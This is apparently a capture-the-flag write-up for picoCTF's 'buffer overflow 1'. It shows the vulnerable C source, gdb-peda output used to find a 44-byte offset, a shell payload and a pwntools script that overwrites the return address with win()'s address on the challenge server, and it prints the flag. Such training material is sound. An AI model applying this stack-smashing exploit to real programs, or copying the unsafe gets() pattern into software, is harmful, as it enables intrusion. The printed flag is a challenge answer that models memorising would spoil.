# Example 1
### buffer overflow 1 (pico ctf)
![image](https://github.com/fahimalshihab/CTF/assets/97816146/1a5ed475-3848-4133-98de-791d2eb79e88)

files : [vuln](https://github.com/fahimalshihab/CTF/blob/df85a1701f5ad1227ce7449c24c71f814a4257c6/Binary%20Exploitation/Buffer%20Overflow/vuln)
& [vuln.c](https://github.com/fahimalshihab/CTF/blob/9e92d32e07e52470452dae9bd0ca4cde18c8f62a/Binary%20Exploitation/Buffer%20Overflow/vuln.c)

 <h3>From code we can see there is a win function .if we can overflow the stack and can give the address of win function . we will get our flag.</h3>

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

#### SOL 1

Here first we have to find the offset so 
```gdb-peda$ pattern create 100```
>> 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

after input this value we will get this
<pre>[----------------------------------registers-----------------------------------]
EAX: 0x41 ('A')
EBX: 0x61414145 ('EAAa')
ECX: 0x41 ('A')
EDX: 0x0 
ESI: 0xffffd034 --> 0xffffd22e ("/home/iftx/Downloads/pico/vuln")
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffcf50 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffcf50 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffcf54 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffcf58 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffcf5c ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffcf60 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffcf64 ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffcf68 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffcf6c ("AA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
*EAX  0x41
*EBX  0x61414145 ('EAAa')
*ECX  0x41
 EDX  0
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
*ESI  0xffffd034 —▸ 0xffffd22e ◂— '/home/iftx/Downloads/pico/vuln'
*EBP  0x41304141 ('AA0A')
*ESP  0xffffcf50 ◂— 'bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
*EIP  0x41414641 ('AFAA')
──────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────
Invalid address 0x41414641

</pre>


Here ```*EIP  0x41414641 ('AFAA')```


Now we gonna find the offset of "AFAA"
```
gdb-peda$ pattern offset AFAA
AFAA found at offset: 44
```
now we know the offset which is 44 , so all we have to do is .Input : 44 + win,s address
so
```
gdb-peda$ disass win
Dump of assembler code for function win:
   0x080491f6 <+0>:	endbr32 
   0x080491fa <+4>:	push   ebp
   0x080491fb <+5>:	mov    ebp,esp
   0x080491fd <+7>:	push   ebx
   0x080491fe <+8>:	sub    esp,0x54
   0x08049201 <+11>:	call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049206 <+16>:	add    ebx,0x2dfa
   0x0804920c <+22>:	sub    esp,0x8
   0x0804920f <+25>:	............................................so on
```
so now the input is

```gdb-peda$ run < <(echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08")```

we will found the flag. now time for remote server .

tips :
```
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
```

script :

```
from pwn import *

# Set up the remote connection
host = "saturn.picoctf.net"
port = 57696
conn = remote(host, port)

# Craft the payload
padding = b"A" * (32+12)  # Fill the buffer
win_address = p32(0x080491f6)  # Address of the win() function
payload = padding + win_address

# Send the payload
conn.sendline(payload)

# Print the received flag
print(conn.recvall().decode())

# Close the connection
conn.close()
```
flag : picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}



